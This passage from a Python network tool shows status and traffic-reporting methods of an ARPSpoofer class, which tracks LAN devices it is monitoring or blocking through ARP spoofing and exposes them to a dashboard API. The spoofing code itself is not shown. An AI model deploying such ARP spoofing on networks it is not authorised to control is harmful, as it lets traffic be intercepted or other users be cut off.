        """Return (monitored_ips, blocked_ips) from the current spoof set."""
        with self._lock:
            monitored = [ip for ip, i in self._spoofed.items() if i.get("mode") != "block"]
            blocked   = [ip for ip, i in self._spoofed.items() if i.get("mode") == "block"]
        return monitored, blocked

    def get_status(self) -> dict:
        # Cheap, throttled re-detect (no ARP) so the dashboard always sees the
        # gateway/subnet for the network we're on RIGHT NOW — this is what lets
        # the UI grey-out the correct gateway row after the machine roams.
        if _SCAPY:
            self._detect_endpoints(force=False)
        monitored, blocked = self._split_by_mode()
        return {
            "active":          bool(monitored or blocked),
            "monitored_count": len(monitored),
            "monitored_ips":   monitored,
            "blocked_count":   len(blocked),
            "blocked_ips":     blocked,
            "gateway_ip":      self.gateway_ip,
            "gateway_mac":     self.gateway_mac,
            "my_ip":           self.my_ip,
            "netmask":         self.netmask,
            "scapy_available": _SCAPY,
        }

    def get_block_status(self) -> dict:
        """Just the blocked-device view, for /api/block/status."""
        if _SCAPY:
            self._detect_endpoints(force=False)
        _, blocked = self._split_by_mode()
        return {
            "active":        len(blocked) > 0,
            "blocked_count": len(blocked),
            "blocked_ips":   blocked,
            "gateway_ip":    self.gateway_ip,
            "my_ip":         self.my_ip,
            "netmask":       self.netmask,
            "scapy_available": _SCAPY,
        }

    def get_traffic(self, target_ip: Optional[str] = None) -> dict:
        with self._lock:
            if target_ip:
                t = self._traffic.get(target_ip)
                return t.to_dict() if t else {}
            return {ip: t.to_dict() for ip, t in self._traffic.items()}


# ── singleton ─────────────────────────────────────────────────────────────────
arp_spoofer = ARPSpoofer()
